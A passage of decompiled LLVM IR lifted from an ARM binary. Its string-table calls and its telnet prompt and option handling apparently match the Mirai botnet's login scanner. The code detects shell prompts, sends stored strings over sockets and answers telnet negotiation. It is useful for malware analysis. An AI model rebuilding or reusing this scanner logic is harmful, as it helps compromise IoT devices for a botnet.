  %v2_109a4 = icmp ugt i8 %v3_10994, 35
  store i1 %v2_109a4, i1* %cpsr_c.global-to-local, align 1
  %v7_109a4 = icmp eq i8 %v3_10994, 36
  store i1 %v7_109a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109a4, label %dec_label_pc_109fc, label %dec_label_pc_109ac

dec_label_pc_109ac:                               ; preds = %dec_label_pc_109a4
  %v2_109ac = icmp ugt i8 %v3_10994, 34
  store i1 %v2_109ac, i1* %cpsr_c.global-to-local, align 1
  %v7_109ac = icmp eq i8 %v3_10994, 35
  store i1 %v7_109ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109ac, label %dec_label_pc_109fc, label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_109ac
  %v2_109b4 = icmp ugt i8 %v3_10994, 36
  store i1 %v2_109b4, i1* %cpsr_c.global-to-local, align 1
  %v7_109b4 = icmp eq i8 %v3_10994, 37
  store i1 %v7_109b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109b4, label %dec_label_pc_109fc, label %dec_label_pc_109e0.preheader

dec_label_pc_109e0.preheader:                     ; preds = %dec_label_pc_109b4
  %v3_109b8 = add i32 %v0_10698, 28
  %v2_109bc = add i32 %v3_109b8, %v3_10980
  store i32 %v2_109bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109e0

dec_label_pc_109c8:                               ; preds = %bb1947
  %v2_109c8 = icmp ugt i8 %v3_109e8, 35
  store i1 %v2_109c8, i1* %cpsr_c.global-to-local, align 1
  %v7_109c8 = icmp eq i8 %v3_109e8, 36
  store i1 %v7_109c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109c8, label %dec_label_pc_109fc, label %dec_label_pc_109d0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109c8
  %v2_109d0 = icmp ugt i8 %v3_109e8, 34
  store i1 %v2_109d0, i1* %cpsr_c.global-to-local, align 1
  %v7_109d0 = icmp eq i8 %v3_109e8, 35
  store i1 %v7_109d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109d0, label %dec_label_pc_109fc, label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %dec_label_pc_109d0
  %v2_109d8 = icmp ugt i8 %v3_109e8, 36
  store i1 %v2_109d8, i1* %cpsr_c.global-to-local, align 1
  %v7_109d8 = icmp eq i8 %v3_109e8, 37
  store i1 %v7_109d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109d8, label %dec_label_pc_109fc, label %dec_label_pc_109e0

dec_label_pc_109e0:                               ; preds = %dec_label_pc_109e0.preheader, %dec_label_pc_109d8
  %v0_109f4695 = phi i32 [ %v2_109bc, %dec_label_pc_109e0.preheader ], [ %v1_109f4, %dec_label_pc_109d8 ]
  %v0_109e0 = phi i32 [ %v1_10984, %dec_label_pc_109e0.preheader ], [ %v1_109e0, %dec_label_pc_109d8 ]
  %v1_109e0 = add i32 %v0_109e0, -1
  store i32 %v1_109e0, i32* %r1.global-to-local, align 4
  %v2_109e0 = icmp ne i32 %v0_109e0, 0
  store i1 %v2_109e0, i1* %cpsr_c.global-to-local, align 1
  %v7_109e0 = icmp eq i32 %v0_109e0, 1
  store i1 %v7_109e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109e0, label %dec_label_pc_1061c.backedge.thread2185, label %dec_label_pc_109e8

dec_label_pc_109e8:                               ; preds = %dec_label_pc_109e0
  %v1_109e8 = add i32 %v0_109f4695, -2
  %v2_109e8 = inttoptr i32 %v1_109e8 to i8*
  %v3_109e8 = load i8, i8* %v2_109e8, align 1
  %v4_109e8 = zext i8 %v3_109e8 to i32
  store i32 %v4_109e8, i32* %r2.global-to-local, align 4
  %v2_109ec = icmp ugt i8 %v3_109e8, 61
  store i1 %v2_109ec, i1* %cpsr_c.global-to-local, align 1
  %v7_109ec = icmp eq i8 %v3_109e8, 62
  store i1 %v7_109ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109ec, label %.thread694, label %bb1947

.thread694:                                       ; preds = %dec_label_pc_109e8
  %v1_109f4696 = add i32 %v0_109f4695, -1
  store i32 %v1_109f4696, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109fc

bb1947:                                           ; preds = %dec_label_pc_109e8
  %v3_109f0 = icmp ugt i8 %v3_109e8, 57
  store i1 %v3_109f0, i1* %cpsr_c.global-to-local, align 1
  %v8_109f0 = icmp eq i8 %v3_109e8, 58
  store i1 %v8_109f0, i1* %cpsr_z.global-to-local, align 1
  %v1_109f4 = add i32 %v0_109f4695, -1
  store i32 %v1_109f4, i32* %r3.global-to-local, align 4
  br i1 %v8_109f0, label %dec_label_pc_109fc, label %dec_label_pc_109c8

dec_label_pc_109fc:                               ; preds = %bb1947, %dec_label_pc_109d8, %dec_label_pc_109d0, %dec_label_pc_109c8, %dec_label_pc_109b4, %dec_label_pc_10990, %.thread694, %dec_label_pc_109ac, %dec_label_pc_109a4, %bb1946
  %v0_10a00 = phi i32 [ %v1_10984, %dec_label_pc_109b4 ], [ %v1_10984, %dec_label_pc_10990 ], [ %v1_109e0, %.thread694 ], [ %v1_10984, %dec_label_pc_109ac ], [ %v1_10984, %dec_label_pc_109a4 ], [ %v1_10984, %bb1946 ], [ %v1_109e0, %dec_label_pc_109c8 ], [ %v1_109e0, %dec_label_pc_109d0 ], [ %v1_109e0, %dec_label_pc_109d8 ], [ %v1_109e0, %bb1947 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10a00 = add i32 %v0_10a00, 1
  store i32 %v1_10a00, i32* @r7, align 4
  %v1_10a04 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_10a14 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_10a14, i32* %r0.global-to-local, align 4
  %v3_10a18 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10a18, i32* %r2.global-to-local, align 4
  store i32 %v3_10a14, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a24 = load i32, i32* @r6, align 4
  %v1_10a24 = add i32 %v0_10a24, 4
  %v2_10a24 = inttoptr i32 %v1_10a24 to i32*
  %v3_10a24 = load i32, i32* %v2_10a24, align 4
  store i32 %v3_10a24, i32* %r0.global-to-local, align 4
  %v4_10a28 = call i32 @__libc_send(i32 %v3_10a24, i32 %v3_10a14, i32 %v3_10a18, i32 16384)
  store i32 %v4_10a28, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10a38 = load i32, i32* @r6, align 4
  %v1_10a38 = add i32 %v0_10a38, 4
  %v2_10a38 = inttoptr i32 %v1_10a38 to i32*
  %v3_10a38 = load i32, i32* %v2_10a38, align 4
  store i32 %v3_10a38, i32* %r0.global-to-local, align 4
  %v4_10a3c = call i32 @__libc_send(i32 %v3_10a38, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10a44 = call i32 @table_lock_val(i32 4)
  store i32 %v1_10a44, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_10a4c = load i32, i32* @r6, align 4
  %v2_10a4c = add i32 %v1_10a4c, 12
  %v3_10a4c = inttoptr i32 %v2_10a4c to i32*
  store i32 8, i32* %v3_10a4c, align 4
  br label %dec_label_pc_107b0

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10698
  %v1_10a54 = add i32 %v0_10698, 24
  %v2_10a54 = inttoptr i32 %v1_10a54 to i32*
  %v3_10a54 = load i32, i32* %v2_10a54, align 4
  store i32 %v3_10a54, i32* %r2.global-to-local, align 4
  %v1_10a58 = add i32 %v3_10a54, -1
  store i32 %v1_10a58, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a5c = icmp eq i32 %v1_10a58, 0
  store i1 %v2_10a5c, i1* %cpsr_z.global-to-local, align 1
  %tmp1948 = icmp slt i32 %v1_10a58, 1
  br i1 %tmp1948, label %dec_label_pc_1061c.backedge.thread, label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a54
  %v2_10a64 = add i32 %v1_10a58, %v0_10698
  store i32 %v2_10a64, i32* %r3.global-to-local, align 4
  %v1_10a68 = add i32 %v2_10a64, 28
  %v2_10a68 = inttoptr i32 %v1_10a68 to i8*
  %v3_10a68 = load i8, i8* %v2_10a68, align 1
  %v4_10a68 = zext i8 %v3_10a68 to i32
  store i32 %v4_10a68, i32* %r3.global-to-local, align 4
  %v2_10a6c = icmp ugt i8 %v3_10a68, 61
  store i1 %v2_10a6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a6c = icmp eq i8 %v3_10a68, 62
  store i1 %v7_10a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a6c, label %dec_label_pc_10ad0, label %bb1949

bb1949:                                           ; preds = %dec_label_pc_10a64
  %v3_10a70 = icmp ugt i8 %v3_10a68, 57
  store i1 %v3_10a70, i1* %cpsr_c.global-to-local, align 1
  %v8_10a70 = icmp eq i8 %v3_10a68, 58
  store i1 %v8_10a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10a70, label %dec_label_pc_10ad0, label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %bb1949
  %v2_10a78 = icmp ugt i8 %v3_10a68, 35
  store i1 %v2_10a78, i1* %cpsr_c.global-to-local, align 1
  %v7_10a78 = icmp eq i8 %v3_10a68, 36
  store i1 %v7_10a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a78, label %dec_label_pc_10ad0, label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a78
  %v2_10a80 = icmp ugt i8 %v3_10a68, 34
  store i1 %v2_10a80, i1* %cpsr_c.global-to-local, align 1
  %v7_10a80 = icmp eq i8 %v3_10a68, 35
  store i1 %v7_10a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a80, label %dec_label_pc_10ad0, label %dec_label_pc_10a88

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a80
  %v2_10a88 = icmp ugt i8 %v3_10a68, 36
  store i1 %v2_10a88, i1* %cpsr_c.global-to-local, align 1
  %v7_10a88 = icmp eq i8 %v3_10a68, 37
  store i1 %v7_10a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a88, label %dec_label_pc_10ad0, label %dec_label_pc_10ab4.preheader

dec_label_pc_10ab4.preheader:                     ; preds = %dec_label_pc_10a88
  %v3_10a8c = add i32 %v0_10698, 28
  %v2_10a90 = add i32 %v3_10a8c, %v3_10a54
  store i32 %v2_10a90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ab4

dec_label_pc_10a9c:                               ; preds = %bb1950
  %v2_10a9c = icmp ugt i8 %v3_10abc, 35
  store i1 %v2_10a9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a9c = icmp eq i8 %v3_10abc, 36
  store i1 %v7_10a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a9c, label %dec_label_pc_10ad0, label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a9c
  %v2_10aa4 = icmp ugt i8 %v3_10abc, 34
  store i1 %v2_10aa4, i1* %cpsr_c.global-to-local, align 1
  %v7_10aa4 = icmp eq i8 %v3_10abc, 35
  store i1 %v7_10aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10aa4, label %dec_label_pc_10ad0, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa4
  %v2_10aac = icmp ugt i8 %v3_10abc, 36
  store i1 %v2_10aac, i1* %cpsr_c.global-to-local, align 1
  %v7_10aac = icmp eq i8 %v3_10abc, 37
  store i1 %v7_10aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10aac, label %dec_label_pc_10ad0, label %dec_label_pc_10ab4

dec_label_pc_10ab4:                               ; preds = %dec_label_pc_10ab4.preheader, %dec_label_pc_10aac
  %v0_10ac8702 = phi i32 [ %v2_10a90, %dec_label_pc_10ab4.preheader ], [ %v1_10ac8, %dec_label_pc_10aac ]
  %v0_10ab4 = phi i32 [ %v1_10a58, %dec_label_pc_10ab4.preheader ], [ %v1_10ab4, %dec_label_pc_10aac ]
  %v1_10ab4 = add i32 %v0_10ab4, -1
  store i32 %v1_10ab4, i32* %r1.global-to-local, align 4
  %v2_10ab4 = icmp ne i32 %v0_10ab4, 0
  store i1 %v2_10ab4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ab4 = icmp eq i32 %v0_10ab4, 1
  store i1 %v7_10ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ab4, label %dec_label_pc_1061c.backedge.thread2185, label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10ab4
  %v1_10abc = add i32 %v0_10ac8702, -2
  %v2_10abc = inttoptr i32 %v1_10abc to i8*
  %v3_10abc = load i8, i8* %v2_10abc, align 1
  %v4_10abc = zext i8 %v3_10abc to i32
  store i32 %v4_10abc, i32* %r2.global-to-local, align 4
  %v2_10ac0 = icmp ugt i8 %v3_10abc, 61
  store i1 %v2_10ac0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ac0 = icmp eq i8 %v3_10abc, 62
  store i1 %v7_10ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ac0, label %.thread701, label %bb1950

.thread701:                                       ; preds = %dec_label_pc_10abc
  %v1_10ac8703 = add i32 %v0_10ac8702, -1
  store i32 %v1_10ac8703, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ad0

bb1950:                                           ; preds = %dec_label_pc_10abc
  %v3_10ac4 = icmp ugt i8 %v3_10abc, 57
  store i1 %v3_10ac4, i1* %cpsr_c.global-to-local, align 1
  %v8_10ac4 = icmp eq i8 %v3_10abc, 58
  store i1 %v8_10ac4, i1* %cpsr_z.global-to-local, align 1
  %v1_10ac8 = add i32 %v0_10ac8702, -1
  store i32 %v1_10ac8, i32* %r3.global-to-local, align 4
  br i1 %v8_10ac4, label %dec_label_pc_10ad0, label %dec_label_pc_10a9c

dec_label_pc_10ad0:                               ; preds = %bb1950, %dec_label_pc_10aac, %dec_label_pc_10aa4, %dec_label_pc_10a9c, %dec_label_pc_10a88, %dec_label_pc_10a64, %.thread701, %dec_label_pc_10a80, %dec_label_pc_10a78, %bb1949
  %v0_10ad4 = phi i32 [ %v1_10a58, %dec_label_pc_10a88 ], [ %v1_10a58, %dec_label_pc_10a64 ], [ %v1_10ab4, %.thread701 ], [ %v1_10a58, %dec_label_pc_10a80 ], [ %v1_10a58, %dec_label_pc_10a78 ], [ %v1_10a58, %bb1949 ], [ %v1_10ab4, %dec_label_pc_10a9c ], [ %v1_10ab4, %dec_label_pc_10aa4 ], [ %v1_10ab4, %dec_label_pc_10aac ], [ %v1_10ab4, %bb1950 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10ad4 = add i32 %v0_10ad4, 1
  store i32 %v1_10ad4, i32* @r7, align 4
  %v1_10ad8 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10ae8 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_10ae8, i32* %r0.global-to-local, align 4
  %v3_10aec = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10aec, i32* %r2.global-to-local, align 4
  store i32 %v3_10ae8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10af8 = load i32, i32* @r6, align 4
  %v1_10af8 = add i32 %v0_10af8, 4
  %v2_10af8 = inttoptr i32 %v1_10af8 to i32*
  %v3_10af8 = load i32, i32* %v2_10af8, align 4
  store i32 %v3_10af8, i32* %r0.global-to-local, align 4
  %v4_10afc = call i32 @__libc_send(i32 %v3_10af8, i32 %v3_10ae8, i32 %v3_10aec, i32 16384)
  store i32 %v4_10afc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10b0c = load i32, i32* @r6, align 4
  %v1_10b0c = add i32 %v0_10b0c, 4
  %v2_10b0c = inttoptr i32 %v1_10b0c to i32*
  %v3_10b0c = load i32, i32* %v2_10b0c, align 4
  store i32 %v3_10b0c, i32* %r0.global-to-local, align 4
  %v4_10b10 = call i32 @__libc_send(i32 %v3_10b0c, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10b18 = call i32 @table_lock_val(i32 6)
  store i32 %v1_10b18, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_10b20 = load i32, i32* @r6, align 4
  %v2_10b20 = add i32 %v1_10b20, 12
  %v3_10b20 = inttoptr i32 %v2_10b20 to i32*
  store i32 7, i32* %v3_10b20, align 4
  br label %dec_label_pc_107b0

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10698
  %v1_10b28 = add i32 %v0_10698, 24
  %v2_10b28 = inttoptr i32 %v1_10b28 to i32*
  %v3_10b28 = load i32, i32* %v2_10b28, align 4
  store i32 %v3_10b28, i32* %r2.global-to-local, align 4
  %v0_10b2c = load i32, i32* @sl, align 4
  store i32 %v0_10b2c, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_10b34766 = icmp eq i32 %v3_10b28, 0
  store i1 %v3_10b34766, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10b34766, i1* %cpsr_z.global-to-local, align 1
  %v6_10b38773 = icmp sgt i32 %v3_10b28, 0
  br i1 %v6_10b38773, label %dec_label_pc_10b3c.preheader, label %dec_label_pc_10be8

dec_label_pc_10b34.loopexit:                      ; preds = %dec_label_pc_10b58
  %v2_10b60 = add i32 %v1_10b60, 2
  store i32 %v2_10b60, i32* @r4, align 4
  %v2_10b64 = add i32 %v1_10b64, 2
  store i32 %v2_10b64, i32* @r7, align 4
  %v3_10b34 = icmp uge i32 %v2_10b64, %v1_10b34
  store i1 %v3_10b34, i1* %cpsr_c.global-to-local, align 1
  %v9_10b34 = icmp eq i32 %v2_10b64, %v1_10b34
  store i1 %v9_10b34, i1* %cpsr_z.global-to-local, align 1
  %v6_10b38 = icmp slt i32 %v2_10b64, %v1_10b34
  br i1 %v6_10b38, label %dec_label_pc_10b3c.preheader, label %dec_label_pc_10be8

dec_label_pc_10b3c.preheader:                     ; preds = %dec_label_pc_10b28, %dec_label_pc_10b34.loopexit
  %v6_10bf01138 = phi i32 [ %v6_10bf01139, %dec_label_pc_10b34.loopexit ], [ %v0_10698, %dec_label_pc_10b28 ]
  %v1_10b641127 = phi i32 [ %v2_10b64, %dec_label_pc_10b34.loopexit ], [ 0, %dec_label_pc_10b28 ]
  %v1_10b481125 = phi i32 [ %v1_10b34, %dec_label_pc_10b34.loopexit ], [ %v3_10b28, %dec_label_pc_10b28 ]
  %v0_10b3c1123 = phi i32 [ %v2_10b60, %dec_label_pc_10b34.loopexit ], [ %v0_10b2c, %dec_label_pc_10b28 ]
  br label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b3c.preheader, %dec_label_pc_10bcc
  %v6_10bf01139 = phi i32 [ %v6_10bf01138, %dec_label_pc_10b3c.preheader ], [ %v0_10bd4, %dec_label_pc_10bcc ]
  %v1_10b64 = phi i32 [ %v1_10b641127, %dec_label_pc_10b3c.preheader ], [ %v1_10bd8, %dec_label_pc_10bcc ]
  %v1_10b34 = phi i32 [ %v1_10b481125, %dec_label_pc_10b3c.preheader ], [ %v3_10bd4, %dec_label_pc_10bcc ]
  %v1_10b60 = phi i32 [ %v0_10b3c1123, %dec_label_pc_10b3c.preheader ], [ %v1_10be0, %dec_label_pc_10bcc ]
  %v1_10b3c = inttoptr i32 %v1_10b60 to i8*
  %v2_10b3c = load i8, i8* %v1_10b3c, align 1
  %v3_10b3c = zext i8 %v2_10b3c to i32
  store i32 %v3_10b3c, i32* @r3, align 4
  %v2_10b40 = icmp eq i8 %v2_10b3c, -1
  store i1 %v2_10b40, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10b40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b40, label %dec_label_pc_10b48, label %dec_label_pc_10be8

dec_label_pc_10b48:                               ; preds = %dec_label_pc_10b3c
  %v0_10b48 = load i32, i32* @sl, align 4
  %v2_10b48 = add i32 %v0_10b48, %v1_10b34
  store i32 %v2_10b48, i32* %r1.global-to-local, align 4
  %v1_10b4c = add i32 %v1_10b60, 1
  store i32 %v1_10b4c, i32* @r5, align 4
  %v3_10b50 = icmp uge i32 %v2_10b48, %v1_10b4c
  store i1 %v3_10b50, i1* %cpsr_c.global-to-local, align 1
  %v9_10b50 = icmp eq i32 %v2_10b48, %v1_10b4c
  store i1 %v9_10b50, i1* %cpsr_z.global-to-local, align 1
  %v2_10b54 = xor i1 %v3_10b50, true
  %v3_10b54 = or i1 %v9_10b50, %v2_10b54
  br i1 %v3_10b54, label %dec_label_pc_10be8, label %dec_label_pc_10b58

dec_label_pc_10b58:                               ; preds = %dec_label_pc_10b48
  %v2_10b58 = inttoptr i32 %v1_10b4c to i8*
  %v3_10b58 = load i8, i8* %v2_10b58, align 1
  %v4_10b58 = zext i8 %v3_10b58 to i32
  store i32 %v4_10b58, i32* @r3, align 4
  %v2_10b5c = icmp eq i8 %v3_10b58, -1
  store i1 %v2_10b5c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b5c, label %dec_label_pc_10b34.loopexit, label %dec_label_pc_10b6c

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b58
  %v2_10b6c = icmp ugt i8 %v3_10b58, -4
  store i1 %v2_10b6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b6c = icmp eq i8 %v3_10b58, -3
  store i1 %v7_10b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b6c, label %dec_label_pc_10ee0, label %dec_label_pc_10b74

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b6c
  %v1_10b74 = add i32 %v1_10b60, 2
  store i32 %v1_10b74, i32* @r3, align 4
  %v3_10b78 = icmp uge i32 %v2_10b48, %v1_10b74
  store i1 %v3_10b78, i1* %cpsr_c.global-to-local, align 1
  %v9_10b78 = icmp eq i32 %v2_10b48, %v1_10b74
  store i1 %v9_10b78, i1* %cpsr_z.global-to-local, align 1
  %v2_10b7c = xor i1 %v3_10b78, true
  %v3_10b7c = or i1 %v9_10b78, %v2_10b7c
  br i1 %v3_10b7c, label %dec_label_pc_10be8, label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10f3c, %bb1966, %.thread745, %dec_label_pc_10b74
  %v0_10b80 = load i32, i32* @r5, align 4
  %v1_10b80 = inttoptr i32 %v0_10b80 to i8*
  %v2_10b80 = load i8, i8* %v1_10b80, align 1
  %v3_10b80 = zext i8 %v2_10b80 to i32
  store i32 %v3_10b80, i32* %r3.global-to-local, align 4
  %v2_10b84 = icmp ugt i8 %v2_10b80, -4
  store i1 %v2_10b84, i1* %cpsr_c.global-to-local, align 1
  %v7_10b84 = icmp eq i8 %v2_10b80, -3
  store i1 %v7_10b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b84, label %.thread707, label %dec_label_pc_10b94

.thread707:                                       ; preds = %dec_label_pc_10b80
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10b80, align 1
  %v0_10b90.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b90.pr.pr, label %.thread710, label %.thread707.dec_label_pc_10b94thread-pre-split_crit_edge

.thread707.dec_label_pc_10b94thread-pre-split_crit_edge: ; preds = %.thread707
  %v0_10b94.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b80, %.thread707.dec_label_pc_10b94thread-pre-split_crit_edge
  %v0_10b94.pr = phi i32 [ %v0_10b94.pr.pre, %.thread707.dec_label_pc_10b94thread-pre-split_crit_edge ], [ %v3_10b80, %dec_label_pc_10b80 ]
  %v2_10b94 = icmp ugt i32 %v0_10b94.pr, 250
  store i1 %v2_10b94, i1* %cpsr_c.global-to-local, align 1
  %v7_10b94 = icmp eq i32 %v0_10b94.pr, 251
  store i1 %v7_10b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b94, label %bb1951, label %.thread710

bb1951:                                           ; preds = %dec_label_pc_10b94
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10b9c = load i32, i32* @r5, align 4
  %v4_10b9c = inttoptr i32 %v3_10b9c to i8*
  store i8 -3, i8* %v4_10b9c, align 1
  br label %.thread710

.thread710:                                       ; preds = %dec_label_pc_10b94, %.thread707, %bb1951
  %v0_10ba0 = load i32, i32* @r4, align 4
  %v1_10ba0 = add i32 %v0_10ba0, 2
  %v2_10ba0 = inttoptr i32 %v1_10ba0 to i8*
  %v3_10ba0 = load i8, i8* %v2_10ba0, align 1
  %v4_10ba0 = zext i8 %v3_10ba0 to i32
  store i32 %v4_10ba0, i32* %r3.global-to-local, align 4
  %v2_10ba4 = icmp ugt i8 %v3_10ba0, -4
  store i1 %v2_10ba4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ba4 = icmp eq i8 %v3_10ba0, -3
  store i1 %v7_10ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ba4, label %.thread711, label %dec_label_pc_10bb4

.thread711:                                       ; preds = %.thread710
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_10ba0, align 1
  %v0_10bb0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10bb0.pr.pr, label %.thread714, label %.thread711.dec_label_pc_10bb4thread-pre-split_crit_edge

.thread711.dec_label_pc_10bb4thread-pre-split_crit_edge: ; preds = %.thread711
  %v0_10bb4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %.thread710, %.thread711.dec_label_pc_10bb4thread-pre-split_crit_edge
  %v0_10bb4.pr = phi i32 [ %v0_10bb4.pr.pre, %.thread711.dec_label_pc_10bb4thread-pre-split_crit_edge ], [ %v4_10ba0, %.thread710 ]
  %v2_10bb4 = icmp ugt i32 %v0_10bb4.pr, 250
  store i1 %v2_10bb4, i1* %cpsr_c.global-to-local, align 1
  %v7_10bb4 = icmp eq i32 %v0_10bb4.pr, 251
  store i1 %v7_10bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bb4, label %bb1952, label %.thread714

bb1952:                                           ; preds = %dec_label_pc_10bb4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10bbc = load i32, i32* @r4, align 4
  %v4_10bbc = add i32 %v3_10bbc, 2
  %v5_10bbc = inttoptr i32 %v4_10bbc to i8*
  store i8 -3, i8* %v5_10bbc, align 1
  br label %.thread714

.thread714:                                       ; preds = %dec_label_pc_10bb4, %.thread711, %bb1952
  %v0_10bc0 = load i32, i32* @r6, align 4
  %v1_10bc0 = add i32 %v0_10bc0, 4
  %v2_10bc0 = inttoptr i32 %v1_10bc0 to i32*
  %v3_10bc0 = load i32, i32* %v2_10bc0, align 4
  store i32 %v3_10bc0, i32* %r0.global-to-local, align 4
  %v0_10bc4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10fb4, %.thread714
  %v0_10bd0 = phi i32 [ %v3_10fd0, %dec_label_pc_10fb4 ], [ %v3_10bc0, %.thread714 ]
  %storemerge5 = phi i32 [ %v2_10efc, %dec_label_pc_10fb4 ], [ %v0_10bc4, %.thread714 ]
  %storemerge4 = phi i32 [ 9, %dec_label_pc_10fb4 ], [ 3, %.thread714 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10bd0 = call i32 @__libc_send(i32 %v0_10bd0, i32 %storemerge5, i32 %storemerge4, i32 16384)
  store i32 %v4_10bd0, i32* %r0.global-to-local, align 4
  %v0_10bd4 = load i32, i32* @r6, align 4
  %v1_10bd4 = add i32 %v0_10bd4, 24
  %v2_10bd4 = inttoptr i32 %v1_10bd4 to i32*
  %v3_10bd4 = load i32, i32* %v2_10bd4, align 4
  store i32 %v3_10bd4, i32* %r2.global-to-local, align 4
  %v0_10bd8 = load i32, i32* @r7, align 4
  %v1_10bd8 = add i32 %v0_10bd8, 3
  store i32 %v1_10bd8, i32* @r7, align 4
  %v3_10bdc = icmp uge i32 %v1_10bd8, %v3_10bd4
  store i1 %v3_10bdc, i1* %cpsr_c.global-to-local, align 1
  %v9_10bdc = icmp eq i32 %v1_10bd8, %v3_10bd4
  store i1 %v9_10bdc, i1* %cpsr_z.global-to-local, align 1
  %v0_10be0 = load i32, i32* @r4, align 4
  %v1_10be0 = add i32 %v0_10be0, 3
  store i32 %v1_10be0, i32* @r4, align 4
